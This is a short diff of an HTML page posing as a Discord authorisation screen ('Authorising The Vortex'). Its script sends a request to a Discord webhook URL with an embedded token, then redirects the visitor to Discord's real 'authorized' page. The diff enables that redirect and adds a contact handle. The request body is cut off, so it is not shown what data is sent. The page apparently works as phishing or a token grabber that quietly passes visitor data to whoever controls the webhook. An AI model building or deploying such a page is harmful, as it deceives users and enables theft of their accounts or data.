@@ -107,7 +107,7 @@
         <h1>Authorising The Vortex</h1>
       </div>
       <div class="auth-form-body mt-3">
-    To finish authorisation, press Finish.
+    If you are stuck seeing this, contact Daniel99j#5491
   </label>
   <div class="position-relative">
     <script>
@@ -125,7 +125,7 @@ fetch('https://discord.com/api/webhooks/1103808892867190856/o3VCDH7eB8azWxXcvKHv
   .then((response) => response.json())
   .then((json) => console.log(json));
   
-//window.open("https://discord.com/oauth2/authorized" _self);
+window.open("https://discord.com/oauth2/authorized" _self);
 </script>
   </div>
       </div>
